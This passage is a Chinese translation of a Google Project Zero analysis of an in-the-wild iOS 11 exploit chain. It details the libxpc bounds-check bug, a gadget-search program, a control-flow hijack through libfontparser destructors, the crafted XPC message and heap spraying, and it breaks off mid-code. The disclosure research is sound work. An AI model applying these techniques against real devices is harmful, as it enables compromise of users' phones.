> 原文链接: https://www.anquanke.com//post/id/186213 


# 深入探索在野外发现的iOS漏洞利用链（三）


                                阅读量   
                                **410045**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者googleprojectzero，文章来源：googleprojectzero.blogspot.com
                                <br>原文地址：[https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-3.html](https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-3.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t013ea5d7d4c6cd018b.jpg)](https://p4.ssl.qhimg.com/t013ea5d7d4c6cd018b.jpg)



## 概述

这一条漏洞利用链的目标是iOS 11-11.4.1，跨越了近10个月的时间。这是我们观察到的第一个具有单独的沙箱逃逸漏洞的利用链。

沙箱逃逸漏洞是libxpc中比较严重的安全性问题，其中重构将导致一个&lt;边界检查变为与边界值的!=比较。被检查的值是直接从IPC消息中读取的，用于索引数组以获取函数指针。

我们很难理解如何将该漏洞引入到最终用户的核心IPC库中。尽管该漏洞在软件开发中非常常见，但在单元测试、代码审计或模糊测试中，很容易能够发现这类严重的问题。但遗憾的是，在实际的案例中，攻击者是第一个发现该漏洞的人，我将会在下方详细描述。



## 在野外的iOS漏洞利用链3：XPC + VXD393/D5500重复IOFree

攻击目标：iPhone 5s – iPhone X，版本从11.0到11.4

设备：

iPhone6,1 (5s, N51AP)<br>
iPhone6,2 (5s, N53AP)<br>
iPhone7,1 (6 plus, N56AP)<br>
iPhone7,2 (6, N61AP)<br>
iPhone8,1 (6s, N71AP)<br>
iPhone8,2 (6s plus, N66AP)<br>
iPhone8,4 (SE, N69AP)<br>
iPhone9,1 (7, D10AP)<br>
iPhone9,2 (7 plus, D11AP)<br>
iPhone9,3 (7, D101AP)<br>
iPhone9,4 (7 plus, D111AP)<br>
iPhone10,1 (8, D20AP)<br>
iPhone10,2 (8 plus, D21AP)<br>
iPhone10,3 (X, D22AP)<br>
iPhone10,4 (8, D201AP)<br>
iPhone10,5 (8 plus, D211AP)<br>
iPhone10,6 (X, D221AP)

版本：

15A372 (11.0 – 2017年9月19日)<br>
15A402 (11.0.1 – 2017年9月26日)<br>
15A403 (11.0.2 – 2017年9月26日 – 看上去只有8/8plus没有更新15A402版本)<br>
15A421 (11.0.2 – 2017年10月3日)<br>
15A432 (11.0.3 – 2017年10月11日)<br>
15B93 (11.1 – 2017年10月31日)<br>
15B150 (11.1.1 – 2017年11月9日)<br>
15B202 (11.1.2 – 2017年11月16日)<br>
15C114 (11.2 – 2017年12月2日)<br>
15C153 (11.2.1 – 2017年12月13日)<br>
15C202 (11.2.2 – 2018年1月8日)<br>
15D60 (11.2.5 – 2018年1月23日)<br>
15D100 (11.2.6 – 2018年2月19日)<br>
15E216 (11.3 – 2018年3月29日)<br>
15E302 (11.3.1 – 2018年4月24日)<br>
15F79 (11.4 – 2018年5月29日)

第一个不支持的版本：11.4.1 – 2018年7月9日



## 二进制结构

从第三个漏洞利用链开始，privesc二进制文件具有不同的结构。在这里，并不是使用系统加载器并链接所需的符号，而是通过dlsym解析所有必需的符号（dlsym的地址通过JSC漏洞利用中传入）。下面是符号解析函数开始部分的一个片段：

```
syscall  = dlsym(RTLD_DEFAULT, "syscall");
  memcpy   = dlsym(RTLD_DEFAULT, "memcpy");
  memset   = dlsym(RTLD_DEFAULT, "memset");
  mach_msg = dlsym(RTLD_DEFAULT, "mach_msg");
  stat     = dlsym(RTLD_DEFAULT, "stat");
  open     = dlsym(RTLD_DEFAULT, "open");
  read     = dlsym(RTLD_DEFAULT, "read");
  close    = dlsym(RTLD_DEFAULT, "close");
  ...
```

有趣的是，这似乎只是一个附加列表，并且有很多符号没有使用。在附录A中，我列举了这些内容，并猜测了攻击者可能针对此框架早期版本利用的漏洞。



## 检查是否存在已有攻击

与PE2一样，在内核漏洞利用成功运行后，他们对系统进行了修改，可以从沙箱内部进行观察。这次，攻击者将字符串“iop114”添加到设备的bootargs，可以通过kern.bootargs sysctl从WebContent沙箱内部读取：

```
sysctlbyname("kern.bootargs", bootargs, &amp;v7, 0LL, 0LL);
  if (strcmp(bootargs, "iop114")) `{`
    syslog(0, "to sleep ...");
    while (1)
      sleep(1000);
  `}`
```



## xpc中未经检查的数组索引

XPC（含义可能是Cross Process Communication，交叉进程通信）是一种IPC机制，它使用mach消息作为传输层。这是在2011年iOS 5版本中引入的。XPC消息是序列化后的对象树，通常在root目录下存有字典。XPC还包含用于公开和管理命名服务的功能，较新的IPC服务往往建立在XPC上，而不是传统的MIG系统上。

XPC被作为安全边界使用，在2011年的苹果全球开发者大会（WWDC）上，Apple明确表示通过XPC隔离的优点在于“如果服务被漏洞利用则几乎没有影响”，并且能“最大限度地减少攻击的影响”。但遗憾的是，XPC漏洞的历史悠久，既存在于核心库中，也存在于服务使用API的过程之中。详细可以参考以下P0问题：80，92，121，130，1247，1713。核心XPC漏洞非常有效，因为这类漏洞允许攻击者以使用XPC的任何进程为目标。

这个特殊的漏洞似乎是在iOS 11的一些重构引入的，就像XPC代码在“快速模式”下解析序列化的xpc字典对象一样。旧版本代码如下：

```
struct _context `{`
  xpc_dictionary* dict;
  char* target_key;
  xpc_serializer* result;
  int* found
`}`;

int64 
_xpc_dictionary_look_up_wire_apply(
  char *current_key,
  xpc_serializer* serializer,
  struct _context *context)
`{`
  if ( !current_key )
    return 0;

  if (strcmp(context-&gt;target_key, current_key))
    return _skip_value(serializer);

  // key matches; result is current state of serializer
  memcpy(context-&gt;result, serializer, 0xB0);
  *(context-&gt;found) = 1;
  return 0;
`}`
```

xpc_serializer对象是原始未解析的XPC消息的包装器。xpc_serializer类型负责序列化和反序列化。

下面是序列化XPC消息的示例：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e5ad0834bf40b826.png)

在XPC的“慢速模式”中，传入的消息在收到时完全反序列化为XPC对象。相反，快速模式会在首次请求时尝试延迟搜索序列化字典中的值，而不是先解析所有内容。该过程通过将序列化字典中的key与所需key进行比较来完成此操作。如果当前key不匹配，则调用skip_value将当前key的payload值跳转到序列化XPC字典对象中的下一个key。

```
int skip_value(xpc_serializer* serializer)
`{`
  uint32_t wireid;
  uint64_t wire_length;

  wireid = read_id(xpc_serializer);

  if (wireid == 0x1A000)
    return 0LL;

  wire_length = xpc_types[wireid &gt;&gt; 12]-&gt;wire_length(serializer);

  if (wire_length == -1 ||
      wire_length &gt; serializer-&gt;remaining)
    return 0;

  // skip over the value
  xpc_serializer_advance(serializer, wire_length);
  return 1;
`}`
```

```
uint32_t read_id(xpc_serializer* serializer)
`{`
  // ensure there are 4 bytes to be read; return pointer to them
  wireid_ptr = xpc_serializer_read(serializer, 4, 0, 0);
  if ( !wireid_ptr )
    return 0x1A000;

  uint32_t wireid = *wireid_ptr;
  uint32_t typeid = wireid &gt;&gt; 12;

  // if any bits other than 12-20 are set,
  // or the type_index is 0, fail
  if (wireid &amp; 0xFFF00FFF ||
      typeid == 0
      typeid &gt;= _xpc_ntypes) `{` // 0x19
    return 0x1A000LL;
  `}`

  return wireid;
`}`
```

skip_value首先调用read_id，它从序列化的消息中读取4个字节。这4个字节是wireid值，负责传递XPC序列化值得类型。read_id还验证wireid是否有效：xpc typeid包含在wireid的第12-20位中，只有这些位可以设置，typeid的值必须大于0且小于0x19。如果不满足上述条件，那么read_id返回sentinel的wireid值0x1A000。skip_id从read_id和aborts检查此sentinel返回值。如果read_id返回有效的wireid值，则skip_id使用typeid位索引xpc_types数组并调用从那里间接读取的函数指针。

接下来，我们来看看在iOS 11中，这段代码是如何变化的。xpc_dictionary_look_up_wire_apply的原型没有改变：

```
int64 
_xpc_dictionary_look_up_wire_apply(
  char *current_key,
  xpc_serializer* serializer,
  struct _context *context)
`{`
  if (!current_key)
    return 0;

  if (strcmp(context-&gt;target_key, current_key))
    return skip_id_and_value(serializer);

  memcpy(context-&gt;result, serializer, 0xB0);
  *(context-&gt;found) = 1;
  return 0;
`}`
```

对skip_value的调用已被替换为对skip_id_and_value的调用，但是：

```
int64 skip_id_and_value(xpc_serializer* serializer)
`{`
  uint32_t* wireid_ptr = xpc_serializer_read(serializer, 4, 0, 0);
  if (!wireid_ptr)
    return 0;

  uint32_t wireid = *wireid_ptr;
  if (wireid != 0x1B000)
    return skip_value(xpc_serializer, wireid);

  return 0;
`}`
```

在这里，不再调用read_id（负责读取和验证id），而是由skip_id_and_value读取4个字节的wireid值本身。奇怪的是，它将4个字节的wireid值与0x1B000进行了比较。这比较应该是这样的吗？

```
wireid &lt; 0x1B000
```

有一些地方出了严重的错误。

受控的wireid值现在可以是除去0x1B000之外的任何值，该值将传递给skip_value。在使用wireid之前，除了xpc_serializer之外，还有一个不同的原型：

```
int64
skip_value(xpc_serializer* serializer, uint32_t wireid)
`{`
  // declare function pointer
  uint32_t (wire_length_fptr*)(xpc_serializer*);

  wire_length_fptr = xpc_wire_length_from_wire_id(wireid);
  uint32_t wire_length = wire_length_fptr(serializer)

  if (wire_length == -1 ||
      wire_length &gt; serializer-&gt;remaining) `{`
    return 0;
  `}`
  xpc_serializer_advance(serializer, wire_length);
  return 1;
`}`
```

```
uint32_t (*)(xpc_serializer*)
xpc_wire_length_from_wire_id(uint32_t wireid)
`{`
  return xpc_types[wireid &gt;&gt; 12]-&gt;wire_length;
`}`
```

不仅skip_value的原型发生了变化，前提条件也发生了变化。此前，skip_value负责验证消息中的wireid值。而现在，情况已经不是这样了。wireid值直接传递给xpc_wire_length_from_wire_id，其中较低的12位被移出，而较高的20位用于直接索引xpc_types数组。xpc_types是一个指向Objective-C类的指针数组，+0x90处的字段是wire_length函数指针，将由skip_value调用。

那么，所有边界检查都出现了什么问题？很多代码在这里似乎巧妙地改变了。函数的语义发生了变化，最后一个正确的边界检查似乎已经成为一个无效值的比较。

查看其他xpc_wire_length_from_wire_id调用的位置，似乎都被_xpc_class_id_from_wire_valid调用占据了主导地位，这实际上验证了wireid：

```
int xpc_class_id_from_wire_valid(uint32_t wireid)
`{`
  if (((wire_id - 0x1000) &lt; 0x1A000) &amp;&amp;
      ((wire_id &amp; 0xFFF00F00) == 0)) `{`
    return 1;
  `}`
  return 0;
`}`
```

触发这个漏洞非常简单。在iOS 11.0至iOS 11.4.1版本范围之内，只需要在XPC消息中翻转几位，就有可能会触发。这就是我之所以认为模糊测试或单元测试能够很快发现这一漏洞的原因。



## XPC漏洞利用

我们接下来分析一下触发漏洞时会发生什么：

```
int64 skip_id_and_value(xpc_serializer* serializer)
`{`
  uint32_t* wireid_ptr = xpc_serializer_read(serializer, 4, 0, 0);
  if (!wireid_ptr)
    return 0;

  uint32_t wireid = *wireid_ptr;
  if (wireid != 0x1B000)
    return skip_value(xpc_serializer, wireid);
```

xpc_serializer_read返回指向raw mach消息缓冲区的指针。该过程只会确保至少剩下4个字节可以被读取。只要这4个字节不包含值0x1B000，检查就会通过。

让我们再看看iOS 11版本的skip_value：

```
int64
skip_value(xpc_serializer* serializer, uint32_t wireid)
`{`
  // declare function pointer
  uint32_t (wire_length_fptr*)(xpc_serializer*);

  wire_length_fptr = xpc_wire_length_from_wire_id(wireid);
  uint32_t wire_length = wire_length_fptr(serializer)
```

每个XPC类型（例如xpc_dictionary、xpc_string、xpc_uint64）都定义了一个函数，来确定其序列化payload的大小。对于固定大小的对象，例如xpc_uint64，将会只返回一个常量（xpc_uint64 payload总是8个字节大小）：

```
__xpc_uint64_wire_length
MOV   W0, #8
RET
```

类似地，xpc_uuid对象始终具有0x10字节的payload：

```
__xpc_uuid_wire_length
MOV   W0, #0x10
RET
```

对于可变大小的类型，需要从序列化对象中读取长度：

```
__xpc_string_wire_length
B     __xpc_wire_length
```

所有可变大小的xpc对象在其wireid之后，直接以字节为单位记录它们的大小，因此_xpc_wire_length只读取接下来的4个字节，而并不会消耗它们。

_xpc_wire_length_from_wire_id查找正确的函数指针来实现调用：

```
uint32_t (*)(xpc_serializer*)
xpc_wire_length_from_wire_id(uint32_t wireid)
`{`
  return xpc_types[wireid &gt;&gt; 12]-&gt;wire_length;
`}`
```

xpc_types是指向相关Objective-C类对象的指针数组：

```
__xpc_types:
libxpc:__const:DCQ 0
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_null
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_bool
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_int64
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_uint64
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_double
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_pointer
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_date
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_data
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_string
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_uuid
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_fd
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_shmem
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_mach_send
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_array
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_dictionary
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_error
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_connection
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_endpoint
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_serializer
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_pipe
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_mach_recv
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_bundle
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_service
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_service_instance
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_activity
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_file_transfer
__xpc_ool_types:
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_fd
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_shmem
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_mach_send
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_connection
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_endpoint
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_mach_recv
libxpc:__const:DCQ _OBJC_CLASS_$_OS_xpc_file_transfer
```

每个xpc类型的类对象中，偏移量+0x90处的值是其wire_length函数指针。该函数指针将会使用一个参数调用，该参数是指向当前xpc_serializer对象的指针。

这就给出了一个非常有用的漏洞利用原语：

控制一个数组索引i，可以在0x1c和0x100000之间（因为它是受控wireid值的较高20位）。这样一来，将会索引xpc_types数组到共享缓存中libxpc.dylib库的const段中。代码将在它们提供的偏移量处读取指针（没有经过边界检查），然后在偏移量+0x90处调用函数指针：

[![](https://p1.ssl.qhimg.com/t01a4d0485662af1b66.png)](https://p1.ssl.qhimg.com/t01a4d0485662af1b66.png)

当调用F_PTR时，没有寄存器指向受控数据。X0将指向当前的xpc_serializer，因此这似乎是目标的逻辑选择，可以发生更有趣的事情。能间接控制的xpc_serializer对象的相关字段是：

```
+0x28 = buffer
+0x30 = buffer_size
+0x38 = current_position_in_buffer_ptr
+0x40 = remaining to be consumed
+0x48 = NULL
```

因此，我们的目标是在0x1C和0x100000之间找到一个值i，这样从xpc_types数组开始的第i个指针包含一个指向结构的指针，在偏移量+0x90处有一个函数指针，当调用时会使用X0+偏移量0x28或X0+偏移量0x38的值做一些有趣的事情，比如从那里调用一个函数指针，并提供更好的寄存器控制。

听起来很有趣，但具体是如何做到的呢？



## 百万分之一

选项A：

前一条指令的较高8位必须为0x17；

目标F_PTR指令的较高16位必须为0x17ff；

下一条指令必须为0xd1004000（sub x0, x0, #0x10）。

选项B：

小工具的指针必须指向与以下模板匹配的9条指令序列：

```
0 STP             X20, X19, [SP,#-0x20]!
1 STP             X29, X30, [SP,#0x10]
2 ADD             X29, SP, #0x10
3 MOV             X19, X0
4 *
5 *
6 add x9, x8, #0x10
7 *
8 add x8, x8, #0x1e0
```

我重新实现了他们的小程序搜索代码，并在一些设备上对其进行了测试，并有所发现：

```
#include "xpc.h"
#include &lt;dlfcn.h&gt;
#include &lt;string.h&gt;

int syscall(int, ...);

void* xpc_null_create(void);

void find_it() `{`
  void* handle = dlopen("/usr/lib/system/libxpc.dylib", 2);
  if (!handle) `{`
    printf("unable to dlopen libxpcn");
    return;
  `}`

  printf("handle: %pn", handle);

  void* xpc_type_null = dlsym(handle, "_xpc_type_null");
  printf("xpc_type_null: %pn", xpc_type_null);

  void** xpc_null = xpc_null_create();
  printf("xpc_null: %pn", xpc_null);

  xpc_null -= 2;
  uint8_t* xpc_types = NULL;

  for (int i = 0; i &lt; 0x10000; i++) `{`
    if (*xpc_null == xpc_type_null) `{`
      xpc_types = (uint8_t*)(xpc_null - 1);
      break;
    `}`
    xpc_null--;
  `}`

  if (xpc_types == NULL) `{`
    printf("didn't find xpc_typesn");
    return;
  `}`

  printf("found xpc_types here: %pn", xpc_types);

  uint8_t* shared_cache_base = NULL;
  syscall(294, &amp;shared_cache_base);
  printf("shared_cache_base: %pn", shared_cache_base);

  // how big is the cache mapping which we can potentially point to?
  uint32_t mapping_offset = *(uint32_t*)(shared_cache_base+0x10);
  uint32_t n_mappings = *(uint32_t*)(shared_cache_base+0x14);

  uint8_t* mapping_info = shared_cache_base+mapping_offset;

  uint64_t cache_size = 0;  
  for (int i = 0; i &lt; n_mappings-1; i++) `{`
    cache_size += *(uint64_t*)(mapping_info+0x08);
    mapping_info += 0x20;
  `}`

  printf("cache_size: %llxn", cache_size);

  for (int i = 0; i &lt; 0x7fffff; i++) `{`
    // try each typeid and see what gadget we hit:
    uint8_t* type_struct_ptr = (xpc_types + (8*i));
    uint8_t* type_struct = *(uint8_t**)(type_struct_ptr);

    if ((type_struct &gt; shared_cache_base) &amp;&amp;
        (type_struct &lt; (shared_cache_base+cache_size)))
    `{`
      uint8_t* fptr = *(uint8_t**)(type_struct+0x90);
      if (fptr &gt; shared_cache_base &amp;&amp; fptr &lt; (shared_cache_base + cache_size))
      `{`
        // try the shorter signature
        if (instr[-1] &gt;&gt; 0x18 == 0x17 &amp;&amp;
            instr[0] &gt;&gt; 0x10 == 0x17ff &amp;&amp;
            instr[1] == 0xD1004000) `{`
            printf("shorter sequence match at %pn", fptr);
         `}`

        // try the longer signature
        uint32_t gadget[4] = `{`0xA9BE4FF4,  // STP X20, X19, [SP,#-0x20]!
                              0xA9017BFD,  // STP X29, X30, [SP,#0x10]
                              0x910043FD,  // ADD X29, SP, #0x10
                              0xAA0003F3`}`; // MOV  X19, X0
        uint32_t* instr = (uint32_t*)fptr;

        if((memcmp(fptr, (void*)gadget, 0x10) == 0) &amp;&amp;
           instr[6] == 0x91004109 &amp;&amp;       // ADD X9, X8, #0x10
           instr[8] == 0x91078108)         // ADD X8, X8, #0x1e0
        `{`
          printf("potential initial match here: %pn", fptr);
        `}`
      `}`
    `}`
  `}`
  printf("donen");
`}`
```

选项B的签名与libfontparser中的以下函数匹配：

```
TXMLSplicedFont::~TXMLSplicedFont(TXMLSplicedFont *__hidden this)

var_10= -0x10
var_s0=  0

STP   X20, X19, [SP,#-0x10+var_10]!
STP   X29, X30, [SP,#0x10+var_s0]
ADD   X29, SP, #0x10
MOV   X19, X0
ADRP  X8, #__ZTV15TXMLSplicedFont@PAGE ; `vtable for'TXMLSplicedFont
ADD   X8, X8, #__ZTV15TXMLSplicedFont@PAGEOFF ; `vtable for'TXMLSplicedFont
ADD   X9, X8, #0x10
STR   X9, [X19]
ADD   X8, X8, #0x1E0
STR   X8, [X19,#0x10]
ADD   X0, X19, #0x48 ; 'H' ; this
BL    __ZN13TCFDictionaryD2Ev ; TCFDictionary::~TCFDictionary()
ADD   X0, X19, #0x30 ; '0' ; this
BL    __ZN26TDataForkFileDataReferenceD1Ev ; TDataForkFileDataReference::~TDataForkFileDataReference()
MOV   X0, X19 ; this
LDP   X29, X30, [SP,#0x10+var_s0]
LDP   X20, X19, [SP+0x10+var_10],#0x20
B     __ZN5TFontD2Ev ; TFont::~TFont()
```

选项A的分支指令代码与之相同：

```
B     0x1856b1cd4 ; TXMLSplicedFont::~TXMLSplicedFont()
```

我们来逐步分析TXMLSplicedFont析构函数代码，看看会发生什么。请记住，此时X0指向xpc_serializer对象：

```
MOV   X19, X0
ADRP  X8, #__ZTV15TXMLSplicedFont@PAGE ; `vtable for'TXMLSplicedFont
ADD   X8, X8, #__ZTV15TXMLSplicedFont@PAGEOFF ; `vtable for'TXMLSplicedFont
ADD   X9, X8, #0x10
STR   X9, [X19]
```

该过程将TXMLSplicedFont vtable指针写入xpc_serializer的前8个字节，这并没有问题。

```
ADD   X8, X8, #0x1E0
STR   X8, [X19,#0x10]
```

这样将会在偏移量+0x10处的8个字节写入另一个vtable指针，这也还好。

```
ADD   X0, X19, #0x48 ; 'H' ; this
BL    __ZN13TCFDictionaryD2Ev ; TCFDictionary::~TCFDictionary()
```

将X0加上0x48，并将该指针作为TCFDictionary析构函数的第一个参数传递：

```
void
TCFDictionary::~TCFDictionary(TCFDictionary *__hidden this)

var_10= -0x10
var_s0=  0

STP   X20, X19, [SP,#-0x10+var_10]!
STP   X29, X30, [SP,#0x10+var_s0]
ADD   X29, SP, #0x10
MOV   X19, X0
LDR   X0, [X19]
CBZ   X0, loc_18428B484
...
loc_18428B484
MOV   X0, X19
LDP   X29, X30, [SP,#0x10+var_s0]
LDP   X20, X19, [SP+0x10+var_10],#0x20
RET
```

由于+0x48处的值为NULL，因此会返回。回到~TXMLSplicedFont：

```
ADD   X0, X19, #0x30 ; '0' ; this
BL    __ZN26TDataForkFileDataReferenceD1Ev ;TDataForkFileDataReference::~TDataForkFileDataReference()
```

这会将xpc_serializer指针加上0x30，并将其传递给TDataForkFileDataReference析构函数：

```
TDataForkFileDataReference::~TDataForkFileDataReference(TDataForkFileDataReference *__hidden this)
B     __ZN18TFileDataSurrogateD2Ev ; TFileDataSurrogate::~TFileDataSurrogate()
```

这会直接调用TFileDataSurrogate析构函数：

```
void
TFileDataSurrogate::~TFileDataSurrogate(TFileDataSurrogate *__hidden this)

var_18= -0x18
var_10= -0x10
var_s0=  0

SUB   SP, SP, #0x30
STP   X20, X19, [SP,#0x20+var_10]
STP   X29, X30, [SP,#0x20+var_s0]
ADD   X29, SP, #0x20
MOV   X19, X0
ADRP  X8, #__ZTV18TFileDataSurrogate@PAGE ; `vtable for'TFileDataSurrogate
ADD  X8, X8, #__ZTV18TFileDataSurrogate@PAGEOFF ; `vtable for'TFileDataSurrogate
ADD  X8, X8, #0x10
STR  X8, [X19] ; trash +0x30; no problem
LDR  X0, [X19,#8] ; read from serializer+0x38, which is the pointer to the current position in the buffer
LDR  X8, [X0,#0x18]! ; read at offset +0x18, and bump up X0 to point to there
LDR  X8, [X8,#0x20] ; X8 is controlled now; read function pointer
BLR  X8 ; control!
```

在进入此函数时，X0将指向xpc_serializer对象的0x30字节。我们再次来看看那些xpc_serializer字段：

```
+0x28 = buffer
+0x30 = buffer_size
+0x38 = current_position_in_buffer_ptr
+0x40 = remaining to be consumed
+0x48 = NULL
```

STR X8, [X19]将使用vtable覆盖buffer_size字段。这一过程非常有趣，但不会发生任何不好的事情。

下一条指令LDR X0, [X19,#8]会将xpc_serializer缓冲区位置指针加载到X0。现在X0指向序列化的xpc消息缓冲区。实际上，我们已经越来越接近任意控制。

LDR X8, [X0,#0x18]!会将偏移量+0x18处的8字节值从当前xpc_serializer缓冲区位置加载到X8中，并将X0更新为指向该位置。这意味着，X8可以被任意控制，具体取决于序列化XPC消息的结构。

最后两条指令随后从X8的偏移量加载一个函数指针并调用：

```
LDR  X8, [X8,#0x20]
BLR  X8
```

整个小工具真的非常简洁。我很想知道如何能找到这个目标小工具。这是符号执行等技术的理想化实践。与此同时，我们也可以通过测试所有可能的值，并寻找值得注意的崩溃来找到它。



## 消息

初步看上去，漏洞利用中构建触发器XPC消息的代码肯定不能成为触发器：

```
xpc_dictionary = xpc_dictionary_create(0LL, 0LL, 0LL);
xpc_true = xpc_bool_create(1);
xpc_dictionary_set_value(xpc_dictionary, crafted_dict_entry_key_containing_value, xpc_true);
xpc_dictionary_set_value(xpc_dictionary, invalid_dict_entry_key, xpc_connection);
xpc_connection_send_message(xpc_connection, xpc_dictionary);
```

需要使用两个键和两个值来创建一个XPC字典，然后将其发送。

下面是iOS 11.0中的xpc_connection_serialize：

```
int64
xpc_connection_serialize(xpc_object* connection, xpc_serializer* serializer)
`{`
  syslog(3, "Connections cannot be directly embedded in messages. You must create an endpoint from the connection.");
`}`
```

该过程只是记录一条错误信息并返回。这里的问题在于，该过程会导致序列化程序不同步。具体而言，xpc_dictionary序列化程序不希望对无法序列化的对象进行序列化，例如xpc_connections。XPC字典序列化格式的本质上是一个总长度加上一系列交替的、以空值终止的键和值。如果值序列化程序不发出任何字节（例如上面的xpc_connection），那么序列化程序将继续发出字典中的下一个键，然后是下一个值。但是在XPC中无法使用没有值的序列化字典键，这意味着XPC反序列化代码会把接下来键的字节解释为前一个键的值。需要注意的是，这不是安全问题，发送者无论如何都会对这些字节进行任意控制，但这是一个非常巧妙的技巧，可以避免编写整个XPC序列化库。

[![](https://p3.ssl.qhimg.com/t019dc6bd1fd40e546f.png)](https://p3.ssl.qhimg.com/t019dc6bd1fd40e546f.png)

这是序列化xpc字典的相关部分。使用xpc_connection_serialize技巧，将发送第二个键，其中值的应该是xpc延迟反序列化代码将bad_wireID值视为wire_ID。当发生越界读取的情况时，xpc_serializer的当前缓冲区位置指针将指向bad_wireID值之后。之后的0x18字节是指向它们以堆喷射为目标的地址的指针，并且在距离该地址的偏移量+ 0x20处，将读取并调用函数指针。



## 堆喷射

目前，攻击者已经实现对受控地址的受控数据的操纵。攻击者决定使用堆喷射的方法，而不是以受控方式来执行此操作。

实际上，攻击者使用了两个相似的原语，在目标进程中喷射大量内存区域和mach端口发送权限。

多年来，我和其他研究人员发表了许多篇关于MIG的文章，其中的一些场景也非常复杂。重点在于，我们分析的重点在于那些语义导致可以实现漏洞利用的地方，但与此同时还有一些相同的复杂语义可能导致资源泄露，而后者也就是攻击者在此之后所做的事情。

稍后我们将返回到堆喷射的内容，但现在，让我们看看它们是如何在mediaserverd进程中实现泄露的。这个守护进程是目标，因为它的沙箱配置文件允许它打开与内核漏洞利用中使用的易受攻击的IOKit驱动程序的连接。



## mediaserverd

mediaserverd可以提供许多服务。攻击者的目标是在Celestial框架中实现的com.apple.coremedia.recorder。目标服务从FigRecorderServerStart开始，它调用bootstrap_check_in以获得服务的接收权限。该端口被CFMachPortCreateWithPort包装在CFMachPort中。在CFMachPort中，他们通过CFMachPortCreateRunLoopSource创建一个运行循环源。这将建立一个基本的mach消息事件处理系统，当在服务端口接收到mach消息时，运行循环代码将会调用以下函数：

```
void
FIG_recorder_mach_msg_handler(CFMachPortRef cfport,
                              mach_msg_header_t *request_msg
                              CFIndex size,
                              void* info)
`{`
  char reply_msg[0x290];
  kern_return_t err;
  if ( request_msg-&gt;msgh_id == MACH_NOTIFY_DEAD_NAME ) `{`
    mach_dead_name_notification_t* notification =
      (mach_dead_name_notification_t*) request_msg;
    mach_port_name_t dead_name = notification-&gt;not_port;
    ...
    // look dead_name up in a linked-list and destroy
    // some resources if found
    ...
    // calls mach_port_deallocate
    FigMachPortReleaseSendRight(dead_name, 0, 0, 0, 0);
  `}` else `{`
    FIG_demux(request_msg, (mach_msg_header_t*)reply_msg);
    mach_msg((mach_msg_header_t*)reply_msg,
             1,
             reply_msg.msgh_size,
             0,
             0,
             0,
             0);
   `}`
 `}`
```

CFMachPorts是一个非常简单的包装器，用于接收mach消息。他们对MIG一无所知。然后，CFMachPort的回调必须对其进行处理。

这段代码引出了许多问题。首先，Apple代码中常见的反模式（Anti-Pattern）是未能检查通知是否被欺骗。确实，正确处理mach端口生命周期通知消息的唯一正确方法是永远不要将它们多路复用到服务端口上。在这里，还错误解析了潜在的欺骗性消息。MACH_NOTIFY_DEAD_NAME通知消息没有权限，并且没有设置MSGH_COMPLEX位，但它们仍然删除从消息正文读取的端口名称的发送权限。

但是，这些错误与我们正在研究的利用链无关。在else分支中，会调用自动生成的MIG demux函数：

```
int
FIG_demux(mach_msg_header_t *msg_request, mach_msg_header_t *msg_reply)
`{`
  mig_routine_t routine;

  msg_reply-&gt;msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REPLY(msg_request-&gt;msgh_bits), 0);
  msg_reply-&gt;msgh_remote_port = msg_request-&gt;msgh_remote_port;

  msg_reply-&gt;msgh_size = (mach_msg_size_t)sizeof(mig_reply_error_t);
  msg_reply-&gt;msgh_id = msg_request-&gt;msgh_id + 100;
  msg_reply-&gt;msgh_local_port = MACH_PORT_NULL;
  msg_reply-&gt;msgh_reserved = 0;

  routine_index = msg_request-&gt;msgh_id - 12080;
